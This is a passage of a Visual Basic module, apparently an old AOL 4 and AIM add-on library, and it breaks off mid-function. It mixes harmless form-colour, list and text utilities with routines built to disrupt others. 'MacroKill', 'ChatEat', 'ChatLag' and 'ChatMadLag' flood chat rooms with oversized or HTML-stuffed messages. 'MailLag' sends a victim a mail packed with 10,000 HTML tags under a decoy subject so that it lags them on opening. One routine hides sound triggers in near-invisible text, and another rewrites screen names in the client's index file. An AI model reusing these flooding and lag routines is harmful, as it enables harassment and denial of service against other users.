Function AoL4_MacroKill3()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 1940
a = a & "#"
Next
AoL4_ChatSend ".<p=" & a
TimeOut 0.1
AoL4_ChatSend ".<p=" & a
End Function
Function AoL4_MacroKill4()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 1940
a = a & "#"
Next
AoL4_ChatSend ".<p=" & a
TimeOut 0.1
AoL4_ChatSend ".<p=" & a
End Function

Sub AOL4_LocateMember(SN)
Call AOL4_Keyword("aol://3548:" & SN)
End Sub
Sub AoL4_InvisibleSound(wav$, Txt$)
AoL4_ChatSend (Txt$ & " <Font Color=#FFFFFE> " & wav$)
End Sub

Sub AoL4_ChatSend(Txt)
    Room% = AOL4_FindRoom()
    If Room% Then
        hChatEdit% = Findit2(Room%, "RICHCNTL")
        ret = SenditByString(hChatEdit%, WM_SETTEXT, 0, Txt)
        ret = SenditbyNum(hChatEdit%, WM_CHAR, 13, 0)
        TimeOut 0.079
    End If
End Sub

Sub AoL4_GhostLetters(Txt As String)
    Room% = AOL4_FindRoom()
    If Room% Then
        hChatEdit% = Findit2(Room%, "RICHCNTL")
    SendKeys (Txt)
    End If
End Sub

Sub AoL3_GhostLetters(Txt As String)
    Room% = AoL3_FindRoom()
    If Room% Then
        Findit2 (Room%), ("RICHCNTL")
    SendKeys (Txt)
    End If
End Sub

Sub AoL4_ChatLink(b4TxT, URL, LinkTxt, AfterTxT)
'Ie
'AoL4_ChatLink ("Click"), ("http:\\Strgame.Com"), ("here"), ("For Warez")
AoL4_ChatSend ("" & b4TxT & "< a href=" & URL & ">" & LinkTxt & "</a> " & AfterTxT)
End Sub

Sub AoL4_ChatLink2(URL, LinkTxt)
'Ie
'AoL4_ChatLink2 ("http:\\Hider.Com"), ("Click")
AoL4_ChatSend ("< a href=" & URL & ">" & LinkTxt & "</a>")
End Sub

Function Findit2(parentw, childhand)
    firs% = GetWindow(parentw, 5)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo found
    firs% = GetWindow(parentw, 5)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo found
    While firs%
        firs% = GetWindow(parentw, 5)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo found
        firs% = GetWindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo found
    Wend
    Findit2 = 0
found:
    firs% = GetWindow(firs%, 2)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    firs% = GetWindow(firs%, 2)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    While firs%
        firs% = GetWindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
        firs% = GetWindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    Wend
    Findit2 = 0
Found2:
    Findit2 = firs%
End Function

Sub AOL4_Keyword(Txt)
'This doesn't bring up the keyword window it does it in
'The toolbar textbox ;)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    Temp% = FindIt(AOL%, "AOL Toolbar")
    Temp% = FindIt(Temp%, "_AOL_Toolbar")
    Temp% = FindIt(Temp%, "_AOL_Combobox")
    KWBox% = FindIt(Temp%, "Edit")
    Call SenditByString(KWBox%, WM_SETTEXT, 0, Txt)
    Call SenditbyNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SenditbyNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub

Sub AoL4_ChatEat()
'This eats the chat so you can't scroll back up
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 1940
a = a + ""
Next
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
TimeOut 0.7
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
TimeOut 0.7
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
End Sub
Sub AoL4_ChatEat2()
'This eats the chat so you can't scroll back up
For i = 1 To 1900
a = a + ""
Next
For Y = 1 To 1900
b = b + " "
Next
AoL4_ChatSend (".<p=" & a)
TimeOut 0.7
AoL4_ChatSend (".<p=" & a)
TimeOut 0.7
AoL4_ChatSend (".<p=" & a)
TimeOut 0.7
AoL4_ChatSend (".<p=" & b)
End Sub
Sub AoL4_ChangeChatCaption(Captn)
Room% = AoL4_FindChatRoom()
Call Caption(Room%, Captn)
End Sub
Sub AoL4_ChatClear()
'This just clears the chat
For i = 1 To 1900
a = a + " "
Next
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
TimeOut 0.001
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
TimeOut 0.001
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
End Sub
Sub AoL4_ChatLag()
For i = 1 To 250
a = a + "<html> </html>"
Next
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
TimeOut 0.001
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
TimeOut 0.001
AoL4_ChatSend ("<FONT COLOR=#FFFFF0>.<p=" & a)
End Sub
Public Sub Form_CenterTop(frm As Form)
   With frm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / (Screen.Height)
   End With
End Sub
    Sub Form_Left(frm As Form)
     Dim x, Y
    Y = (Screen.Height - frm.Height) / 2
    x = 0
    frm.Move x, Y
    End Sub
Sub Form_Top(frm As Form)
Dim x, Y
    Y = 0
    x = (Screen.Width - frm.Width) / 2
    frm.Move x, Y
End Sub
Sub Form_Flash(frm As Form)
frm.Show
frm.BackColor = &H0&
Pause (".1")
frm.BackColor = &HFF&
Pause (".1")
frm.BackColor = &HFF0000
Pause (".1")
frm.BackColor = &HFF00&
Pause (".1")
frm.BackColor = &H8080FF
Pause (".1")
frm.BackColor = &HFFFF00
Pause (".1")
frm.BackColor = &H80FF&
Pause (".1")
frm.BackColor = &HC0C0C0
End Sub

Sub Form_FadeFire(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 0
Y = Y - frm.Height / 255 * 1
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(255, red, 0), BF
Loop
End Sub
Sub Form_FadeBlue(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 0
Y = Y - frm.Height / 255 * 1
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(0, 0, red), BF
Loop
End Sub
Sub Form_CircleFire(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 1
blue = blue - frm.Width / 255 * 1
frm.FillColor = RGB(255, red, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Sub Form_Circles(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 1
blue = blue - frm.Width / 255 * 1
frm.FillColor = RGB(255, blue, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Sub Form_CoupleCircle(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 5
blue = blue - frm.Width / 255 * 20
frm.FillColor = RGB(red, 0, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Sub Form_CircleRedFlare(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 5
blue = blue - frm.Width / 255 * 10
frm.FillColor = RGB(red, 0, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub
Sub Form_CircleShiny(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 5
blue = blue - frm.Width / 255 * 5
frm.FillColor = RGB(red, 0, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(255, red, 0)
Loop
End Sub

Sub Form_CircleRed(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 1
blue = blue - frm.Width / 255 * 1
frm.FillColor = RGB(red, 0, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(red, 0, 0)
Loop
End Sub

Sub Form_CircleBlue(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 1
blue = blue - frm.Width / 255 * 1
frm.FillColor = RGB(0, 0, red)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(0, 0, red)
Loop
End Sub

Sub Form_CircleGreen(frm As Object)
Dim x
Dim Y
Dim red
Dim blue
x = frm.Width
Y = frm.Height
frm.FillStyle = 0
red = 0
blue = frm.Width
Do Until red = 255
red = red + 1
blue = blue - frm.Width / 255 * 1
frm.FillColor = RGB(0, red, 0)
If blue < 0 Then Exit Do
frm.Circle (frm.Width / 2, frm.Height / 2), blue, RGB(0, red, 0)
Loop
End Sub

Sub Form_SideRed(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 0
x = x - frm.Width / 255 * 1
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(red, 0, 0), BF
Loop
End Sub
Sub Form_SideGreen(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 0
x = x - frm.Width / 255 * 1
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(0, red, 0), BF
Loop
End Sub

Sub Form_SideBlue(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 0
x = x - frm.Width / 255 * 1
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(0, 0, red), BF
Loop
End Sub

Sub Form_SideFire(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 0
x = x - frm.Width / 255 * 1
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(255, red, 0), BF
Loop
End Sub
Sub Form_LightYellow(frm As Object)
Dim x
Dim Y
Dim red
Dim Green
Dim blue
x = frm.Width
Y = frm.Height
red = 255
Green = 255
blue = 255
Do Until red = 25
x = x - frm.Width / 255 * 2
red = red - 1
frm.Line (0, 0)-(x, Y), RGB(255, red, 0), BF
Loop
End Sub

Sub Form_BlueFade(frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 2
    frm.ScaleHeight = 256
    For intLoop = 0 To 255
    frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub Form_GreenFade(frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 2
    frm.ScaleHeight = 256
    For intLoop = 0 To 255
    frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub Form_RedFade(frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 2
    frm.ScaleHeight = 256
    For intLoop = 0 To 255
    frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub Form_FireFade(frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 2
    frm.ScaleHeight = 256
    For intLoop = 0 To 255
    frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub Form_SilverFade(frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 2
    frm.ScaleHeight = 256
    For intLoop = 0 To 255
    frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub Form_IceFade(frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 2
    frm.ScaleHeight = 256
    For intLoop = 0 To 255
    frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 255), B
    Next intLoop
End Sub
Function AoL4_ImIgnore(SN)
AoL4_ImSend ("$Im_Off, " & SN), ("Ignoring Ims From " & SN)
End Function
Function AoL4_ImUnignore(SN)
AoL4_ImSend ("$Im_On, " & SN), ("Unignoring Ims From " & SN)
End Function
Function GetCaption(hwnd)
hwndlength% = GetWindowTextLength(hwnd)
hWndTitle$ = String$(hwndlength%, 0)
Qo0% = GetWindowText(hwnd, hWndTitle$, (hwndlength% + 1))

GetCaption = hWndTitle$
End Function
Function GetAPIText(hwnd As Integer) As String
x = SenditbyNum(hwnd%, WM_GETTEXTLENGTH, 0, 0)
    text$ = Space(x + 1)
    x = SenditByString(hwnd%, WM_GETTEXT, x + 1, text$)
    GetAPIText = FixAPIString(text$)
End Function

Function FixAPIString(sText As String) As String
On Error Resume Next
If InStr(sText$, Chr$(0)) <> 0 Then FixAPIString = Trim(Mid$(sText$, 1, InStr(sText$, Chr$(0)) - 1))
If InStr(sText$, Chr$(0)) = 0 Then FixAPIString = Trim(sText$)
End Function

Function FindItsTitle(parentw, childhand)
Num1% = GetWindow(parentw, 5)
If UCase(GetCaption(Num1%)) Like UCase(childhand) Then GoTo god
Num1% = GetWindow(parentw, GW_CHILD)

While Num1%
Num2% = GetWindow(parentw, 5)
If UCase(GetCaption(Num2%)) Like UCase(childhand) & "*" Then GoTo god
Num1% = GetWindow(Num1%, 2)
If UCase(GetCaption(Num1%)) Like UCase(childhand) & "*" Then GoTo god
Wend
FindItsTitle = 0

god:
Qo0% = Num1%
FindItsTitle = Qo0%
End Function

Sub List_Add(List As ListBox, Txt$)
On Error Resume Next
DoEvents
For x = 0 To List.ListCount - 1
    If UCase$(List.List(x)) = UCase$(Txt$) Then Exit Sub
Next
If Len(Txt$) <> 0 Then List.AddItem Txt$
End Sub

Function List_Count(Lst As ListBox)
x = Lst.ListCount
List_Count = x
End Function

Sub List_KillDupes(Lst As Control)
On Error Resume Next
   For a = 0 To Lst.ListCount - 1
   For b = 0 To Lst.ListCount - 1
If LCase(Lst.List(a)) Like LCase(Lst.List(b)) And a <> b Then
   Lst.RemoveItem (b)
       End If
 Next b
 Next a
End Sub

Sub Combo_KillDupes(Cmb As Control)
   For a = 0 To Cmb.ListCount - 1
   For b = 0 To Cmb.ListCount - 1
If LCase(Cmb.List(a)) Like LCase(Cmb.List(b)) And a <> b Then
   Cmb.RemoveItem (b)
       End If
 Next b
 Next a
End Sub

Function Combo_Count(Cmb As ComboBox)
x = Cmb.ListCount
Combo_Count = x
End Function

Function List_AddFonts(Lst As ListBox)
For x = 1 To Screen.FontCount
Lst.AddItem Screen.Fonts(x)
Next
Lst.AddItem Str$(x)
Lst.RemoveItem Screen.FontCount
End Function

Sub Sn_Reset(SN As String, dir As String, Replace As String)
On Error Resume Next
SN$ = SN$ + String(10 - Len(SN$), Chr(32))
Replace$ = Replace$ + String(10 - Len(Replace$), Chr(32))
Free = FreeFile
Open dir$ + "\idb\main.idx" For Binary As #Free
For x = 1 To LOF(Free) Step 32000
text$ = Space(32000)
Get #Free, x, text$
meeh:
If InStr(1, text$, SN$, 1) Then
Where = InStr(1, text$, SN$, 1)
Put #Free, (x + Where) - 1, Replace$
Mid$(text$, Where, 10) = String(10, " ")
GoTo meeh
End If
DoEvents
Next x
Close #Free
End Sub

Sub Sn_NewUser(dir As String, Replace As String)
On Error Resume Next
SN$ = SN$ + String(10 - Len(SN$), Chr(32))
Replace$ = Replace$ + String(10 - Len(Replace$), Chr(32))
Free = FreeFile
Open dir$ + "\idb\main.idx" For Binary As #Free
For x = 1 To LOF(Free) Step 32000
text$ = Space(32000)
Get #Free, x, text$
meeh:
If InStr(1, text$, SN$, 1) Then
Where = InStr(1, text$, SN$, 1)
SN$ = ("New User")
Put #Free, (x + Where) - 1, Replace$
Mid$(text$, Where, 10) = String(10, " ")
GoTo meeh
End If
DoEvents
Next x
Close #Free
End Sub
Sub List_AddAscii(Lst As ListBox)
For x = 33 To 255
Lst.AddItem Chr(x) + ""
Next x
End Sub

Sub Combo_AddAscii(Cmb As ComboBox)
For x = 33 To 255
Cmb.AddItem Chr(x) + ""
Next x
End Sub
Sub AoL4_SwitchSn()
'I know that some people hate send keys, but
'i think they are handy and save writing
'five lines of code
Call AoL4_Windo
SendKeys "%S"
SendKeys 13
End Sub

Sub AoL4_OpenPictGallery()
'I know that some people hate send keys, but
'i think they are handy and save writing
'five lines of code
Call AoL4_Windo
SendKeys "%FOO"
End Sub

Sub AoL4_Open()
'I know that some people hate send keys, but
'i think they are handy and save writing
'five lines of code
Call AoL4_Windo
SendKeys "%FO"
SendKeys 13
End Sub

Sub Comp_OpenExe(dir)
Shell (dir)
End Sub

Function Combo_AddFonts(Cmb As ComboBox)
For x = 1 To Screen.FontCount
Cmb.AddItem Screen.Fonts(x)
Next
Cmb.AddItem Str$(x)
Cmb.RemoveItem Screen.FontCount
End Function

Function Text_Spaced(strin As TextBox)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + " "
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_Spaced = NewSent$
End Function

Sub AoL4_BotScramble(Txtbox As TextBox, txtbx As TextBox, Textbx As TextBox, Lst As ListBox)
txtbx.Locked = True
If Txtbox.text = "" Then
MsgBox "You have to choose a word to scramble", vbMsgBoxRtlReading, "Error"
End If
txtbx.text = (Text_Scramble(Txtbox))
AoL4_ChatSend ("Unscramble: " & txtbx & " Clue: " & Textbx)
If AoL4_LastChatLine Like LCase(Txtbox) Then
AoL4_ChatSend (AoL4_SNFromLastChatLine & " You Got it Correct!")
Lst.AddItem AoL4_SNFromLastChatLine
End If
End Sub

Sub AoL3_BotScramble(Txtbox As TextBox, txtbx As TextBox, Textbx As TextBox, Lst As ListBox)
txtbx.Locked = True
If Txtbox.text = "" Then
MsgBox "You have to choose a word to scramble", vbMsgBoxRtlReading, "Error"
End If
txtbx.text = (Text_Scramble(Txtbox))
AoL3_ChatSend ("Unscramble: " & txtbx & " Clue: " & Textbx)
If AoL3_LastChatLine Like LCase(Txtbox) Then
AoL3_ChatSend (AoL3_SnFromLastChatLine & " You Got it Correct!")
Lst.AddItem AoL3_SnFromLastChatLine
End If
End Sub

Sub HideWelcome()
Wel% = FindItsTitle(MDI, "Welcome, " & UserSN)
If Wel% = 0 Then Exit Sub
ShowWindow Wel%, SW_HIDE
End Sub

Sub ShowWelcome()
Wel% = FindItsTitle(MDI, "Welcome, " & UserSN)
If Wel% = 0 Then Exit Sub
ShowWindow Wel%, SW_SHOW
End Sub

Sub AiM_ChatCrack(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    AB$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    t$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    h$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    m$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    v$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b> <b> " & AB$ & " </b><i> " & U$ & " </i><u> " & s$ & " </u><s> " & t$ & " </s><b> " & Y$ & " </b><sup> " & L$ & " </sup><i> " & f$ & " </i><u> " & b$ & " <S> " & c$ & " </u> " & D$ & " </s><b> " & h$ & " <u> " & j$ & " </b></u><i> " & K$ & " <b><s><i><u> " & m$ & " </i></u><b><s> " & n$ & " </b></s><i><u> " & q$ & " <b></i></u> " & v$ & " </b> " & Z$
Next W
AiM_ChatSend (PC$)
End Sub

Sub AoL4_ChatCrack(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    AB$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    t$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    h$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    m$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    v$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b> <b> " & AB$ & " </b><i> " & U$ & " </i><u> " & s$ & " </u><s> " & t$ & " </s><b> " & Y$ & " </b><sup> " & L$ & " </sup><i> " & f$ & " </i><u> " & b$ & " <S> " & c$ & " </u> " & D$ & " </s><b> " & h$ & " <u> " & j$ & " </b></u><i> " & K$ & " <b><s><i><u> " & m$ & " </i></u><b><s> " & n$ & " </b></s><i><u> " & q$ & " <b></i></u> " & v$ & " </b> " & Z$
Next W
AoL4_ChatSend (PC$)
End Sub

Sub AoL4_ChatLame()
'This will say Im Lame Like A Thousand and 1
'Times In the chat room
For i = 1 To 200
a = a + " Im Lame "
Next
AoL4_ChatSend ".<p=" & a
End Sub

Sub AoL4_ChatLeet()
'This will say Im Leet Like A Thousand and 1
'Times In the chat room
For i = 1 To 200
a = a + " Im Leet "
Next
AoL4_ChatSend ".<p=" & a
End Sub
Sub AoL4_ChatLong(Txt)
'This will say something Like A Thousand and 1
'Times In the chat room
For i = 1 To 100
a = a + Txt
Next
AoL4_ChatSend ".<p=" & a
End Sub
Sub AoL4_ChatScroll1(Txt)
'This is pretty phat
For i = 1 To 10
a = a + ("                                               " & Txt)
Next
AoL4_ChatSend ".<p=" & a
End Sub
Sub AoL4_ChatScroll2(Txt)
'This is pretty phat
For i = 1 To 15
a = a + ("                                      " & Txt)
Next
AoL4_ChatSend ".<p=" & a
End Sub

Sub Text_Flash(Txt As TextBox)
Txt.ForeColor = QBColor(Rnd * 15)
NoFreeze% = DoEvents()
End Sub

Sub Text_SpiralScroll(Txt As TextBox)
x = Txt.text
thastart:
Dim MYLEN As Integer
me1 = Txt.text
MYLEN = Len(me1)
MYSTR = Mid(me1, 2, MYLEN) + Mid(me1, 1, 1)
Txt.text = MYSTR
TimeOut 1
If Txt.text = x Then
Exit Sub
End If
GoTo thastart
End Sub

Sub AoL4_MailLag(ScreenNames)
'This will lag the hell outta the person when
'they open up the mail
'(P.S. To stop it hit esc)
For i = 1 To 10000
a = a + "<html></html>"
Next
AoL4_MailSend (ScreenNames), ("Important Message About Chat Rooms"), ("meeh owns you" & a)
End Sub

Sub AoL4_ChatMadLag()
'This will lag the chat room
'(P.S. To stop it hold esc)
For i = 1 To 150
a = a + "</html><html>"
Next
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
AoL4_ChatSend "'<FONT COLOR=#FFFFF0>.<p=" & a
TimeOut (1#)
End Sub

Sub AoL4_ChatWavy(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    AB$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    t$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    b$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    h$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    m$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    v$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "</Sub><Sup>" & AB$ & "</Sup><Sub>" & U$ & "</Sub><Sup>" & s$ & "</Sup><Sub>" & t$ & "</Sub><Sup>" & Y$ & "</Sup><Sub>" & L$ & "</Sub><Sup>" & f$ & "</Sup><Sub>" & b$ & "</Sub><Sup>" & c$ & "</Sup><Sub>" & D$ & "</Sub><Sup>" & h$ & "</Sup><Sub>" & j$ & "</Sub><Sup>" & K$ & "</Sup><Sub>" & m$ & "</Sub><Sup>" & n$ & "</Sup><Sub>" & q$ & "</Sub><Sup>" & v$ & "</Sup><Sub>" & Z$
Next W
AoL4_ChatSend (PC$)
End Sub

Function Text_Scramble(Txt)
'Ie: Text2.text = (Scramble_Text(txT))

findlastspace = Mid(Txt, Len(Txt), 1)
If Not findlastspace = " " Then
Txt = Txt & " "
Else
Txt = Txt
End If
For scrambling = 1 To Len(Txt)
TheChar$ = Mid(Txt, scrambling, 1)
Char$ = Char$ & TheChar$
If TheChar$ = " " Then
chars$ = Mid(Char$, 1, Len(Char$) - 1)
firstchar$ = Mid(chars$, 1, 1)
On Error GoTo gods
LastChar$ = Mid(chars$, Len(chars$), 1)
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo meeh
gods:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo Fuck
meeh:
scrambled$ = scrambled$ & LastChar$ & firstchar$ & backchar$ & " "
Fuck:
Char$ = ""
backchar$ = ""
End If
Next scrambling
Text_Scramble = scrambled$
Exit Function
End Function

Function Text_Dots(strin As TextBox)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "."
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_Dots = NewSent$
End Function

Function Text_backwards(strin As TextBox)
Let inptxt$ = strin
Let Lenth% = Len(inptxt$)
Do While NumSpc% <= Lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NewSent$ = NextChr$ & NewSent$
Loop
Text_backwards = NewSent$
End Function

Sub AoL4_BotWelcome(B4, After)
'ie: AoL4_BotWelcome ("· Sup Sup "), (" ·")
If (AoL4_SNFromLastChatLine) Like ("OnlineHost") Then
